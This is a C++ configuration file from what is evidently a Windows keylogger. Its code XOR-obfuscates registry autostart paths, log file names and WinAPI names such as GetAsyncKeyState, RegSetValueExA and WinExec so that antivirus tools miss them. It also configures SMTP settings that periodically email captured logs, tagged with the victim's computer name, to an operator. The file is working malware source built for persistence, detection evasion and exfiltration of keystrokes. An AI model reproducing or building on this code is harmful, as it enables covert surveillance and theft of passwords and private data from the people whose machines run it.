#include "Config.h"

Config::Config() {
    //COPY HERE-----------------------------------------------------------------
    //MAIL
        //MAIL
    this->host = "INSERT_HOST";
    this->login = "INSERT_LOGIN";
    this->password = "INSERT_PASSWORRD";
    this->port = "INSERT_PORT";
    this->toMail = "INSERT_TO_MAIL";
    this->sendMailTime = 10; //w sekundach
    //KEY ENCRYPT
    this->key = "C2fBn2yiKAwAgXgTSYYs7AyGmtSiqCCumr1Invfkixll77vFR1E0DyHsrkiTE8gw";
    //REGISTRY AUTOSTART
    this->regKeyDir = "107D201639732B2C170C1E221537143B352D05245E2F1D281A070F2A043131100306672C1C050F0407243E1959";
    this->regKeyName = "0E4B27321E00";
    this->RegFilePath = "00083A171D570B1A1711163515210C08173C2A18432E091B06112A051E2424101F5C54310B";
    this->mutexRunKey = "c21f81f31c6d2f4897bce8d4af1d91c2";
    this->timeFileName = "375B0B274046011D";
    this->logFileName = "221C0E36035E";
    //WINAPI
    //DLL files name:
    this->advapi32Library = "025610231E5B4A5B65251B2D";
    this->kernel32Library = "0857142C0B5E4A5B65251B2D";
    this->user32Library = "164103305D00570D272D";
    //Function DLL WinApi name:
    this->CopyFileAFunction = "005D163B285B150C0A";
    this->RegOpenKeyExAFunction = "1157010D1E5717222E38323926";
    this->RegSetValueExAFunction = "115701110B462F08273412041F19";
    this->RegCloseKeyFunction = "11570101025D0A0C00240E";
    this->RegDeleteValueFunction = "115701060B5E1C1D2E17162D123D";
    this->WinExecFunction = "145B080716571A";
    this->AsyncKeyStateFunction = "045712031D4B170A00240E1213391331";
    //END COPY-----------------------------------------------------------------
    this->xorTmp = new Xor(this->key);
    // cout << this->xorTmp->encryptDecryptTest(this->RegFilePath, true) << endl;
}

int Config::GetSendMailTime() {
    return this->sendMailTime;
}

string Config::GetHost() {
    return this->xorTmp->encryptDecryptTest(this->host, true);
}

string Config::GetKey() {
    return this->key;
}

string Config::GetLogin() {
    return this->xorTmp->encryptDecryptTest(this->login, true);
}

string Config::GetPassword() {
    return this->xorTmp->encryptDecryptTest(this->password, true);
}

string Config::GetPort() {
    return this->xorTmp->encryptDecryptTest(this->port, true);
}

string Config::GetToMail() {
    return this->xorTmp->encryptDecryptTest(this->toMail, true);
}

string Config::GetRegFilePath() {
    return string(this->xorTmp->encryptDecryptTest(this->RegFilePath, true)); // +'\0'
}

string Config::GetRegKeyDir() {
    return this->xorTmp->encryptDecryptTest(this->regKeyDir, true);
}

string Config::GetRegKeyName() {
    // cout << this->xorTmp->encryptDecryptTest("3A30340D0F581F16162234390432", true);
    return this->xorTmp->encryptDecryptTest(this->regKeyName, true);
}

string Config::GetMutexRunKey() {
    return this->mutexRunKey;
}

string Config::GetTimeFileName() {
    return this->xorTmp->encryptDecryptTest(this->timeFileName, true);
}

string Config::GetLogFileName() {
    return this->xorTmp->encryptDecryptTest(this->logFileName, true);
}

string Config::getComputerName() {
    TCHAR nazwaKomputera[MAX_COMPUTERNAME_LENGTH + 2];
    DWORD rozmiar = sizeof (nazwaKomputera) / sizeof (nazwaKomputera[0]);
    GetComputerName(nazwaKomputera, &rozmiar);
    return nazwaKomputera;
}

string Config::getEmailSubject() {
    string temat = "(PKey - [";
    temat.append(this->getComputerName());
    temat.append("]) ");
    return temat;
}

LPCTSTR Config::StringToLPCTSTR(string str) {
    //string to LPCTSTR
    LPTSTR lptstrConvertTmp = new TCHAR[str.size() + 1];
    strcpy(lptstrConvertTmp, str.c_str());
    return lptstrConvertTmp;
}

void Config::generateFileConfig() {
    //    string hostSTMP;
    //    FILE * pFile;
    //    pFile = fopen("config.txt", "a");
    //    fputs("Config::Config() {", pFile);
    //    fputs("//MAIL", pFile);
    //    fputs("this->host = \""+hostSTMP.c_+"\";", pFile);
    //    fclose(pFile);
    //    return 0;
}

string Config::GetAsyncKeyStateFunction() {
    return this->xorTmp->encryptDecryptTest(this->AsyncKeyStateFunction, true);
    return this->AsyncKeyStateFunction;
}

string Config::GetCopyFileAFunction() {
    return this->xorTmp->encryptDecryptTest(this->CopyFileAFunction, true);
    return this->CopyFileAFunction;
}

string Config::GetRegCloseKeyFunction() {
    return this->xorTmp->encryptDecryptTest(this->RegCloseKeyFunction, true);
    return this->RegCloseKeyFunction;
}

string Config::GetRegDeleteValueFunction() {
    return this->xorTmp->encryptDecryptTest(this->RegDeleteValueFunction, true);
    return this->RegDeleteValueFunction;
}

string Config::GetRegOpenKeyExAFunction() {
    return this->xorTmp->encryptDecryptTest(this->RegOpenKeyExAFunction, true);
    return this->RegOpenKeyExAFunction;
}

string Config::GetRegSetValueExAFunction() {
    return this->xorTmp->encryptDecryptTest(this->RegSetValueExAFunction, true);
    return this->RegSetValueExAFunction;
}

string Config::GetWinExecFunction() {
    return this->xorTmp->encryptDecryptTest(this->WinExecFunction, true);
    return this->WinExecFunction;
}

string Config::GetAdvapi32Library() {
    return this->xorTmp->encryptDecryptTest(this->advapi32Library, true);
    return this->advapi32Library;
}

string Config::GetKernel32Library() {
    return this->xorTmp->encryptDecryptTest(this->kernel32Library, true);
    return this->kernel32Library;
}

string Config::GetUser32Library() {
    return this->xorTmp->encryptDecryptTest(this->user32Library, true);
    return this->user32Library;
}